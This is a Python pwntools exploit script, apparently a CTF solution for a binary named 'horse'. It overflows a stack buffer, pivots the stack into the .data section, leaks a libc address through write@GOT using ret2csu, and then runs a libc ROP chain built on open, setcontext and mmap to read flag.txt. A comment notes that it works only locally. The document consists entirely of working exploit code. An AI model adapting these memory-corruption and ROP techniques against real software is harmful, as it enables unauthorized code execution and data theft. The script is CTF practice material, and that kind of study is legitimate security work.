from pwn import *

# ATTENTION! THIS EXPLOIT WORKS ONLY LOCAL BECAUSE SERVER HAS FLAG WITH MANGLED NAME WHICH YOU NEED TO GET VIA ONE MORE SYSCALL GETDENTS64

def get_libc_csu_init_frame(ret2csu_1, ret2csu_2, rbx, rbp, edi, rsi, rdx):
	return p64(ret2csu_1) + p64( rbx // 8 ) + p64(rbp) + p64(rbx % 8) + \
		p64(edi) + p64(rsi) + p64(rdx) + p64(ret2csu_2)

p = process('./horse')
elf = ELF('./horse')
libc = ELF('../../2.35-0ubuntu3_amd64/libc.so.6')

padding = b'a' * 40

main = elf.sym["main"]

pop_rdi = 0x400c03
pop_rsi_r15 = 0x400c01
pop_rsp_m = 0x400bfd
ret = 0x4005a8

write_got = elf.got["write"]
write_plt = elf.plt["write"]

ret2csu_1 = 0x400bfa
ret2csu_2 = 0x400be0

writeable = 0x602200
read_got = elf.got["read"]
read_plt = elf.plt["read"]

leak2base = 0x114a20

# stack-pivoting with groomed .data section via read() 

rop_chain = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(writeable) + p64(0) + p64(read_plt) + \
			p64(pop_rsp_m) + p64(writeable)

payload = padding + rop_chain

p.sendline(payload)

print("\x1b[034m[+] Stack pivoted\x1b[0m")

# groomed data for libc

w_csu_init_frame = get_libc_csu_init_frame(ret2csu_1, ret2csu_2, write_got, write_got // 8 + 1, 1, write_got, 8)

payload = b'\x00' * 24 + w_csu_init_frame + p64(0) + \
			p64(read_got // 8) + p64((read_got // 8) + 1) + p64(0) + \
			p64(0) + p64(writeable + 0xd0) + p64(1024) + p64(ret2csu_2) + b"flag.txt\x00"

p.sendline(payload)

print("\x1b[32m[+] .data section was groomed\x1b[0m")
pause()

libc_leak = u64(p.recv(0x10a)[-8:])

print(f"\x1b[31m[+] Libc leak : {hex(libc_leak)}\x1b[0m")

libc_base = libc_leak - leak2base

print(f"\x1b[33m[+] Libc base : {hex(libc_base)}\x1b[0m")

# find gadgets

push_rax = libc_base + 0x41563

pop_rdx_1 = libc_base + 0x11f497
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rax = libc_base + 0x45eb0
xchg_rsi_rax = libc_base + 0x1b5ce5

syscall = libc_base + 0x140ffb
setcontext = libc_base + libc.sym["setcontext"] + 0x12e
mmap = libc_base + libc.sym["mmap"]
open_ = libc_base + 0x87250

print(f"[i] pop rdx ; pop ... ; ret : {hex(pop_rdx_1)}")
print(f"[i] pop rsi ; ret : {hex(pop_rsi)}")
print(f"[i] pop rdi ; ret : {hex(pop_rdi)}")
print(f"[i] Setcontext + : {hex(setcontext)}")
print(f"[i] Mmap : {hex(mmap)}")

# open flag.txt

payload = p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(writeable + 0x98) + p64(pop_rsi) + p64(0) + \
		p64(pop_rdx_1) + p64(0) * 2 + p64(syscall) + \
		p64(pop_rdx_1) + p64(writeable + 0x170) + p64(0) + p64(setcontext) + p64(mmap) + \
		p64(pop_rsp_m) + p64(writeable + 0x210 - 24) + p64(0) * 3 + \
		p64(0) * 5 + p64(3) + p64(0) + p64(0) * 5 + p64(0) + p64(0x0) + p64(0x1000) * 3 + p64(0x1) + \
		p64(0) + p64(0x2) + \
		p64(pop_rdi) + p64(1) + p64(pop_rdx_1) + p64(write_got + 0xd) + p64(0) + p64(xchg_rsi_rax) 

p.sendline(payload)

flag = p.recv(100).decode().strip()

print(f"[+] flag : {flag}")
